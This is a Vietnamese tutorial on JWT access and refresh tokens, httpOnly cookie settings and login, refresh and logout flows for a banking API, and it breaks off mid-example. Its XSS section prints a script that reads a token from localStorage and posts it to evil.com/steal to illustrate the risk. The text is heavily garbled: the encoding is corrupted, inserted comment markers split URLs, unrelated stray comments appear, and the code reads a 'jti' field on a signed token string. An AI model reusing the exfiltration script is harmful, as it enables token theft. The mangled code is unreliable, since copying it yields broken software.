‚îÇ  ‚îÇ ‚Ä¢ Th·ªùi h·∫°n: Session (ƒë√≥ng browser = m·∫•t)                    ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ L∆∞u ·ªü: httpOnly Cookie                                    ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ D√πng ƒë·ªÉ: Session ID (server tracking)                     ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ B·∫£o m·∫≠t: httpOnly + Secure                                ‚îÇ ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

#### **üîê 1. Access Token vs Refresh Token - Ph√¢n Bi·ªát Chi Ti·∫øt**

**Access Token (Token Truy C·∫≠p):**

```typescript
// C·∫•u tr√∫c JWT Access Token
{
  "header": {
    "alg": "RS256",      // Thu·∫≠t to√°n m√£ h√≥a (RSA + SHA256)
    "typ": "JWT"
  },
  "payload": {
    "sub": "user123", // Ch√∫ gi·∫£i: User ID
    "name": "John Doe",
    "email": "john@example.com",
    "role": "trader", // Ch√∫ gi·∫£i: Role: admin, trader, customer
    "permissions": ["trade", "view_balance", "transfer"],
    "iat": 1699999999,   // Issued At (th·ªùi ƒëi·ªÉm t·∫°o)
    "exp": 1700000899    // Expiry (h·∫øt h·∫°n sau 15 ph√∫t)
  },
  "signature": "..."     // Ch·ªØ k√Ω s·ªë (verify token kh√¥ng b·ªã gi·∫£ m·∫°o)
}

// ƒê·∫∑c ƒëi·ªÉm:
// ‚úÖ Th·ªùi h·∫°n ng·∫Øn: 5-15 ph√∫t
 // Ch√∫ gi·∫£i: ‚úÖ L∆∞u trong memory (JavaScript variable)
// ‚úÖ G·ª≠i k√®m m·ªçi API request: Authorization: Bearer <token>
// ‚úÖ Ch·ª©a th√¥ng tin user (role, permissions)
// ‚ùå KH√îNG l∆∞u localStorage/sessionStorage (XSS risk)
```

**Refresh Token (Token L√†m M·ªõi):**

```typescript
// C·∫•u tr√∫c Refresh Token (th∆∞·ªùng l√† random string)
{
  "jti": "unique-token-id-abc123xyz", // Ch√∫ gi·∫£i: Token ID duy nh·∫•t
  "sub": "user123", // Ch√∫ gi·∫£i: User ID
  "iat": 1699999999, // Ch√∫ gi·∫£i: Issued At
  "exp": 1702591999                    // Expiry (h·∫øt h·∫°n sau 30 ng√†y)
}

// ƒê·∫∑c ƒëi·ªÉm:
// ‚úÖ Th·ªùi h·∫°n d√†i: 7-30 ng√†y (ho·∫∑c v√¥ th·ªùi h·∫°n)
// ‚úÖ L∆∞u trong httpOnly Cookie (kh√¥ng ƒë·ªçc ƒë∆∞·ª£c b·∫±ng JS)
// ‚úÖ Ch·ªâ d√πng ƒë·ªÉ l·∫•y Access Token m·ªõi
// ‚úÖ C√≥ th·ªÉ revoke (thu h·ªìi) t·ª´ server
// ‚ùå KH√îNG g·ª≠i k√®m API th∆∞·ªùng (ch·ªâ g·ª≠i t·ªõi /refresh endpoint)
```

**T·∫°i Sao C·∫ßn 2 Token?**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                    T·∫†I SAO C·∫¶N 2 TOKEN?                    ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                            ‚îÇ
‚îÇ  Scenario 1: Ch·ªâ d√πng 1 Access Token d√†i h·∫°n              ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ
‚îÇ  ‚îÇ ‚ùå N·∫øu token b·ªã leak (XSS, network sniffing)         ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    ‚Üí Hacker c√≥ 30 ng√†y ƒë·ªÉ d√πng token                 ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    ‚Üí Kh√¥ng th·ªÉ thu h·ªìi (revoke)                      ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    ‚Üí R·ª¶I RO C·ª∞C CAO!                                 ‚îÇ ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ
‚îÇ                                                            ‚îÇ
‚îÇ  Scenario 2: D√πng Access Token (15 ph√∫t) + Refresh Token  ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ
‚îÇ  ‚îÇ ‚úÖ Access Token b·ªã leak                              ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    ‚Üí Ch·ªâ d√πng ƒë∆∞·ª£c 15 ph√∫t                           ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    ‚Üí T·ª± ƒë·ªông h·∫øt h·∫°n                                 ‚îÇ ‚îÇ
‚îÇ  ‚îÇ                                                       ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚úÖ Refresh Token b·ªã leak                             ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    ‚Üí L∆∞u httpOnly cookie (kh√≥ b·ªã XSS)               ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    ‚Üí Server c√≥ th·ªÉ revoke (blacklist)               ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    ‚Üí C√≥ th·ªÉ detect suspicious activity               ‚îÇ ‚îÇ
‚îÇ  ‚îÇ                                                       ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Üí R·ª¶I RO TH·∫§P H∆†N NHI·ªÄU!                             ‚îÇ ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

#### **üîÑ 2. Authentication Flow Chi Ti·∫øt (Step-by-Step)**

**A. Login Flow (ƒêƒÉng Nh·∫≠p):**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: B∆Ø·ªöC 1: User Login
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: Frontend: G·ª≠i username + password
async function login(username: string, password: string) {
  try {
    const response = await fetch('https: // Ch√∫ gi·∫£i: api.bank.com/auth/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        username,
        password,
 // Ch√∫ gi·∫£i: Optional: MFA code, device fingerprint
        mfaCode: '123456',
        deviceId: getDeviceFingerprint(),
      }),
      credentials: 'include', // Quan tr·ªçng: Cho ph√©p g·ª≠i/nh·∫≠n cookie
    });

    if (!response.ok) {
      throw new Error('Login failed');
    }

    const data = await response.json();
    
 // Ch√∫ gi·∫£i: {
 // Thu gom r√°c t·ª± ƒë·ªông: runtime ƒë√°nh d·∫•u v√† qu√©t c√°c object kh√¥ng c√≤n truy c·∫≠p ƒë·ªÉ gi·∫£i ph√≥ng b·ªô nh·ªõ.
 // Ch√∫ gi·∫£i: user: { id: "123", name: "John", role: "trader" },
    //   expiresIn: 900  // 15 ph√∫t (900 gi√¢y)
 // Ch√∫ gi·∫£i: }
    
    // Refresh Token ƒë∆∞·ª£c server t·ª± ƒë·ªông set v√†o httpOnly cookie
 // Ch√∫ gi·∫£i: Set-Cookie: refreshToken=xyz...; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000
    
    return data;
  } catch (error) {
    console.error('Login error:', error);
    throw error;
  }
}

 // Ch√∫ gi·∫£i: ============================================
// B∆Ø·ªöC 2: Server X·ª≠ L√Ω Login
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: Backend (Node.js/Express)
app.post('/auth/login', async (req, res) => {
  const { username, password, mfaCode } = req.body;
  
 // Ch√∫ gi·∫£i: 1. Verify username + password (bcrypt)
  const user = await db.findUserByUsername(username);
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
 // Ch√∫ gi·∫£i: 2. Verify MFA (Multi-Factor Authentication)
  if (!verifyMFA(user, mfaCode)) {
    return res.status(401).json({ error: 'Invalid MFA code' });
  }
  
 // Ch√∫ gi·∫£i: 3. Check account status (not locked, not suspended)
  if (user.isLocked || user.isSuspended) {
    return res.status(403).json({ error: 'Account locked' });
  }
  
  // 4. Generate Access Token (15 ph√∫t)
  const accessToken = jwt.sign(
    {
      sub: user.id,
      name: user.name,
      email: user.email,
      role: user.role,
      permissions: user.permissions,
    },
    process.env.ACCESS_TOKEN_SECRET, // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.
    { expiresIn: '15m' }  // 15 ph√∫t
  );
  
  // 5. Generate Refresh Token (30 ng√†y)
  const refreshToken = jwt.sign(
    {
      jti: uuidv4(), // Ch√∫ gi·∫£i: Unique token ID
      sub: user.id,
    },
    process.env.REFRESH_TOKEN_SECRET,
    { expiresIn: '30d' }  // 30 ng√†y
  );
  
  // 6. L∆∞u Refresh Token v√†o database (ƒë·ªÉ c√≥ th·ªÉ revoke sau)
  await db.saveRefreshToken({
    tokenId: refreshToken.jti,
    userId: user.id,
    expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
    deviceInfo: req.headers['user-agent'],
    ipAddress: req.ip,
  });
  
  // 7. Set Refresh Token v√†o httpOnly Cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,    // JavaScript kh√¥ng ƒë·ªçc ƒë∆∞·ª£c (ch·ªëng XSS)
    secure: true, // Ch√∫ gi·∫£i: Ch·ªâ g·ª≠i qua HTTPS
    sameSite: 'strict', // Ch√∫ gi·∫£i: Ch·ªëng CSRF
    maxAge: 30 * 24 * 60 * 60 * 1000,  // 30 ng√†y
    path: '/auth/refresh', // Ch√∫ gi·∫£i: Ch·ªâ g·ª≠i t·ªõi endpoint refresh
  });
  
 // Ch√∫ gi·∫£i: 8. Log login event (audit trail)
  await logEvent({
    type: 'LOGIN_SUCCESS',
    userId: user.id,
    ipAddress: req.ip,
    deviceInfo: req.headers['user-agent'],
    timestamp: new Date(),
  });
  
  // 9. Return Access Token v·ªÅ client
  res.json({
    accessToken,
    user: {
      id: user.id,
      name: user.name,
      email: user.email,
      role: user.role,
    },
    expiresIn: 900,  // 15 ph√∫t
  });
});

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: B∆Ø·ªöC 3: Frontend L∆∞u Access Token
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: Store Access Token in memory (JavaScript variable)
let accessToken: string | null = null;

async function handleLogin(username: string, password: string) {
  const response = await login(username, password);
  
 // Ch√∫ gi·∫£i: L∆∞u Access Token trong memory
  accessToken = response.accessToken;
  
  // L∆∞u user info (kh√¥ng sensitive) v√†o localStorage
  localStorage.setItem('user', JSON.stringify(response.user));
  
 // Ch√∫ gi·∫£i: Redirect to dashboard
  window.location.href = '/dashboard';
}

// ‚ùå KH√îNG BAO GI·ªú L√ÄM NH∆Ø N√ÄY:
 // Ch√∫ gi·∫£i: localStorage.setItem('accessToken', token);  // XSS risk!
 // Ch√∫ gi·∫£i: sessionStorage.setItem('accessToken', token); // V·∫´n XSS risk!
```

---

**B. API Call Flow (G·ªçi API v·ªõi Access Token):**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: Frontend: G·ªçi API v·ªõi Access Token
 // Ch√∫ gi·∫£i: ============================================

// Helper function: T·ª± ƒë·ªông attach Access Token
async function apiCall(url: string, options: RequestInit = {}) {
  // N·∫øu Access Token h·∫øt h·∫°n ‚Üí refresh tr∆∞·ªõc
  if (isTokenExpired(accessToken)) {
    await refreshAccessToken();
  }
  
 // Ch√∫ gi·∫£i: G·ª≠i request v·ªõi Access Token
  const response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${accessToken}`, // Ch√∫ gi·∫£i: G·ª≠i token
    },
    credentials: 'include', // Ch√∫ gi·∫£i: G·ª≠i cookies (refresh token)
  });
  
  // N·∫øu 401 Unauthorized ‚Üí token invalid, logout
  if (response.status === 401) {
    await logout();
    window.location.href = '/login';
    throw new Error('Unauthorized');
  }
  
  return response.json();
}

// Usage: G·ªçi API l·∫•y s·ªë d∆∞ t√†i kho·∫£n
const balance = await apiCall('https: // Ch√∫ gi·∫£i: api.bank.com/account/balance');
console.log(balance); // Ch√∫ gi·∫£i: { balance: 1000000, currency: 'VND' }

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: Backend: Verify Access Token
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: Middleware: Verify JWT token
function authenticateToken(req, res, next) {
 // Ch√∫ gi·∫£i: 1. L·∫•y token t·ª´ header
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // Ch√∫ gi·∫£i: "Bearer <token>"
  
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
 // Ch√∫ gi·∫£i: 2. Verify token
  jwt.verify(token, process.env.ACCESS_TOKEN_SECRET, (err, user) => {
    if (err) {
      // Token expired ho·∫∑c invalid
      return res.status(403).json({ error: 'Invalid token' });
    }
    
    // 3. Attach user info v√†o request
    req.user = user; // Ch√∫ gi·∫£i: { sub: "123", role: "trader", ... }
    next();
  });
}

 // Ch√∫ gi·∫£i: Protected route
app.get('/account/balance', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  const balance = await db.getBalance(userId);
  res.json(balance);
});
```

---

**C. Refresh Token Flow (L√†m M·ªõi Access Token):**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: Frontend: Refresh Access Token
 // Ch√∫ gi·∫£i: ============================================

async function refreshAccessToken(): Promise<void> {
  try {
    const response = await fetch('https: // Ch√∫ gi·∫£i: api.bank.com/auth/refresh', {
      method: 'POST',
      credentials: 'include', // Ch√∫ gi·∫£i: G·ª≠i httpOnly cookie (refreshToken)
      headers: {
        'Content-Type': 'application/json',
      },
    });
    
    if (!response.ok) {
      // Refresh token h·∫øt h·∫°n ho·∫∑c invalid ‚Üí logout
      throw new Error('Refresh token expired');
    }
    
    const data = await response.json();
 // Ch√∫ gi·∫£i: {
 // Ch√∫ gi·∫£i: accessToken: "new-token...",
 // Ch√∫ gi·∫£i: expiresIn: 900
 // Ch√∫ gi·∫£i: }
    
 // Ch√∫ gi·∫£i: C·∫≠p nh·∫≠t Access Token m·ªõi
    accessToken = data.accessToken;
    
    console.log('Access token refreshed');
  } catch (error) {
    console.error('Refresh failed:', error);
    
 // Ch√∫ gi·∫£i: Logout user
    await logout();
    window.location.href = '/login';
  }
}

// Auto-refresh token tr∆∞·ªõc khi h·∫øt h·∫°n
function startTokenRefreshTimer() {
  // Refresh token tr∆∞·ªõc 1 ph√∫t khi h·∫øt h·∫°n
  const refreshTime = (15 - 1) * 60 * 1000;  // 14 ph√∫t
  
  setInterval(async () => {
    await refreshAccessToken();
  }, refreshTime);
}

// G·ªçi khi app kh·ªüi ƒë·ªông
startTokenRefreshTimer();

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: Backend: Refresh Token Endpoint
 // Ch√∫ gi·∫£i: ============================================

app.post('/auth/refresh', async (req, res) => {
 // Ch√∫ gi·∫£i: 1. L·∫•y Refresh Token t·ª´ httpOnly cookie
  const refreshToken = req.cookies.refreshToken;
  
  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }
  
  try {
 // Ch√∫ gi·∫£i: 2. Verify Refresh Token
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
    
 // Ch√∫ gi·∫£i: 3. Check token trong database (ch∆∞a b·ªã revoke?)
    const tokenRecord = await db.findRefreshToken(decoded.jti);
    if (!tokenRecord || tokenRecord.isRevoked) {
      return res.status(403).json({ error: 'Token revoked' });
    }
    
    // 4. Check user v·∫´n c√≤n active
    const user = await db.findUserById(decoded.sub);
    if (!user || user.isLocked) {
      return res.status(403).json({ error: 'User inactive' });
    }
    
 // Ch√∫ gi·∫£i: 5. Generate Access Token m·ªõi
    const newAccessToken = jwt.sign(
      {
        sub: user.id,
        name: user.name,
        email: user.email,
        role: user.role,
        permissions: user.permissions,
      },
      process.env.ACCESS_TOKEN_SECRET,
      { expiresIn: '15m' }
    );
    
 // Ch√∫ gi·∫£i: 6. Log refresh event
    await logEvent({
      type: 'TOKEN_REFRESH',
      userId: user.id,
      tokenId: decoded.jti,
      timestamp: new Date(),
    });
    
 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
    res.json({
      accessToken: newAccessToken,
      expiresIn: 900,
    });
    
  } catch (error) {
    // Token expired ho·∫∑c invalid
    return res.status(403).json({ error: 'Invalid refresh token' });
  }
});
```

---

**D. Logout Flow (ƒêƒÉng Xu·∫•t):**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: Frontend: Logout
 // Ch√∫ gi·∫£i: ============================================

async function logout(): Promise<void> {
  try {
 // Ch√∫ gi·∫£i: 1. G·ªçi API logout (revoke refresh token)
    await fetch('https: // Ch√∫ gi·∫£i: api.bank.com/auth/logout', {
      method: 'POST',
      credentials: 'include', // Ch√∫ gi·∫£i: G·ª≠i refreshToken cookie
    });
    
    // 2. X√≥a Access Token kh·ªèi memory
    accessToken = null;
    
    // 3. X√≥a user info kh·ªèi localStorage
    localStorage.removeItem('user');
    
 // Ch√∫ gi·∫£i: 4. Clear any cached data
    sessionStorage.clear();
    
 // Ch√∫ gi·∫£i: 5. Redirect to login
    window.location.href = '/login';
    
  } catch (error) {
    console.error('Logout error:', error);
    // V·∫´n redirect v·ªÅ login d√π c√≥ l·ªói
    window.location.href = '/login';
  }
}

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: Backend: Logout Endpoint
 // Ch√∫ gi·∫£i: ============================================

app.post('/auth/logout', async (req, res) => {
 // Ch√∫ gi·∫£i: 1. L·∫•y Refresh Token t·ª´ cookie
  const refreshToken = req.cookies.refreshToken;
  
  if (refreshToken) {
    try {
 // Ch√∫ gi·∫£i: 2. Decode token
      const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
      
 // Ch√∫ gi·∫£i: 3. Revoke token trong database (blacklist)
      await db.revokeRefreshToken(decoded.jti);
      
 // Ch√∫ gi·∫£i: 4. Log logout event
      await logEvent({
        type: 'LOGOUT',
        userId: decoded.sub,
        tokenId: decoded.jti,
        timestamp: new Date(),
      });
      
    } catch (error) {
      console.error('Logout error:', error);
    }
  }
  
  // 5. X√≥a Refresh Token cookie
  res.clearCookie('refreshToken', {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/auth/refresh',
  });
  
 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
  res.json({ message: 'Logged out successfully' });
});
```

---

#### **üõ°Ô∏è 3. Security Best Practices (Th·ª±c H√†nh B·∫£o M·∫≠t)**

**A. Cookie Security:**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: SECURE COOKIE CONFIGURATION
 // Ch√∫ gi·∫£i: ============================================

// ‚úÖ ƒê√öNG: Secure httpOnly Cookie
res.cookie('refreshToken', token, {
  httpOnly: true,    // JavaScript KH√îNG ƒë·ªçc ƒë∆∞·ª£c (ch·ªëng XSS)
  secure: true,      // Ch·ªâ g·ª≠i qua HTTPS (kh√¥ng qua HTTP)
  sameSite: 'strict', // Ch·ªëng CSRF (kh√¥ng g·ª≠i cross-site)
  maxAge: 30 * 24 * 60 * 60 * 1000,  // 30 ng√†y
  path: '/auth/refresh', // Ch√∫ gi·∫£i: Ch·ªâ g·ª≠i t·ªõi endpoint refresh
  domain: '.bank.com',  // Cho ph√©p subdomain
});

// ‚ùå SAI: Kh√¥ng secure
res.cookie('refreshToken', token, {
  httpOnly: false,   // ‚ùå JS ƒë·ªçc ƒë∆∞·ª£c ‚Üí XSS risk
  secure: false, // Ch√∫ gi·∫£i: ‚ùå G·ª≠i qua HTTP ‚Üí MITM attack
  sameSite: 'none', // Ch√∫ gi·∫£i: ‚ùå G·ª≠i cross-site ‚Üí CSRF risk
});

 // Ch√∫ gi·∫£i: ============================================
// Cookie Attributes Gi·∫£i Th√≠ch
 // Ch√∫ gi·∫£i: ============================================

/**
 * httpOnly: true
 * - JavaScript kh√¥ng ƒë·ªçc ƒë∆∞·ª£c: document.cookie = undefined
 * - Ch·ªâ server ƒë·ªçc ƒë∆∞·ª£c
 * - Ch·ªëng XSS: Hacker inject script c≈©ng kh√¥ng l·∫•y ƒë∆∞·ª£c cookie
 * 
 * secure: true
 * - Ch·ªâ g·ª≠i qua HTTPS (kh√¥ng qua HTTP)
 * - Ch·ªëng MITM (Man-In-The-Middle) attack
 * - Production MUST c√≥
 * 
 * sameSite: 'strict'
 * - Kh√¥ng g·ª≠i cookie khi navigate t·ª´ site kh√°c
 * - Example: evil.com ‚Üí bank.com (cookie KH√îNG g·ª≠i)
 * - Ch·ªëng CSRF attack
 * - Options: 'strict' | 'lax' | 'none'
 *   - strict: Kh√¥ng g·ª≠i cross-site (most secure)
 *   - lax: G·ª≠i khi GET navigation (moderate)
 *   - none: G·ª≠i m·ªçi cross-site (least secure)
 * 
 * path: '/auth/refresh'
 * - Cookie ch·ªâ g·ª≠i t·ªõi endpoint n√†y
 * - Gi·∫£m exposure (kh√¥ng g·ª≠i t·ªõi m·ªçi endpoint)
 * 
 * domain: '.bank.com'
 * - Cho ph√©p subdomain: api.bank.com, www.bank.com
 * - Kh√¥ng set = ch·ªâ exact domain
 */
```

**B. Token Storage:**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: WHERE TO STORE TOKENS?
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: ‚úÖ Access Token: MEMORY (JavaScript variable)
let accessToken: string | null = null;

// L√Ω do:
// - M·∫•t khi refresh page (an to√†n h∆°n)
// - Kh√¥ng b·ªã XSS n·∫øu page refresh
// - Short-lived (15 ph√∫t) n√™n OK

 // Ch√∫ gi·∫£i: ‚úÖ Refresh Token: httpOnly Cookie
 // Ch√∫ gi·∫£i: Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict

// L√Ω do:
// - JavaScript kh√¥ng ƒë·ªçc ƒë∆∞·ª£c (ch·ªëng XSS)
 // Ch√∫ gi·∫£i: - Auto g·ª≠i v·ªõi requests (convenient)
 // Ch√∫ gi·∫£i: - Long-lived nh∆∞ng secure

 // Ch√∫ gi·∫£i: ‚ùå NEVER:
localStorage.setItem('accessToken', token); // Ch√∫ gi·∫£i: ‚ùå XSS risk!
sessionStorage.setItem('accessToken', token); // Ch√∫ gi·∫£i: ‚ùå V·∫´n XSS risk!
document.cookie = `accessToken=${token}`; // Ch√∫ gi·∫£i: ‚ùå Readable by JS

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: XSS Attack Example
 // Ch√∫ gi·∫£i: ============================================

// N·∫øu l∆∞u token trong localStorage:
 // Ch√∫ gi·∫£i: Hacker inject script:
<script>
 // Ch√∫ gi·∫£i: Steal token
  const token = localStorage.getItem('accessToken');
  
 // Ch√∫ gi·∫£i: Send to hacker server
  fetch('https: // Ch√∫ gi·∫£i: evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token }),
  });
  
  // Now hacker c√≥ token ‚Üí impersonate user!
</script>

// N·∫øu d√πng httpOnly cookie:
 // Ch√∫ gi·∫£i: Hacker inject script:
<script>
 // Ch√∫ gi·∫£i: Try to steal
